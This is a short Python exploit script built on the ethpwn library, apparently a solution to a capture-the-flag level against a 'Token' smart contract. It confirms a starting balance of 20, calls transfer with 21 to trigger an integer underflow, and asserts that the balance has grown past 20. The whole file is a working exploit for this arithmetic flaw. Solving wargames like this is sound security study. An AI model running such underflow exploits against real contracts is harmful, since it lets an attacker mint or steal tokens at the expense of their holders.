import sys
from ethpwn import *

context.log_level = 'DEBUG'

CONTRACT_ADDR, = sys.argv[1:]

token = register_contract('Token', CONTRACT_ADDR, source_files=['token.sol'])

print('Balance:', token.functions.balanceOf(get_wallet(None).address).call())
assert token.functions.balanceOf(get_wallet(None).address).call() == 20

transact(token.functions.transfer(CONTRACT_ADDR, 21), debug_transaction_errors=True)
print('Balance:', token.functions.balanceOf(get_wallet(None).address).call())
assert token.functions.balanceOf(get_wallet(None).address).call() > 20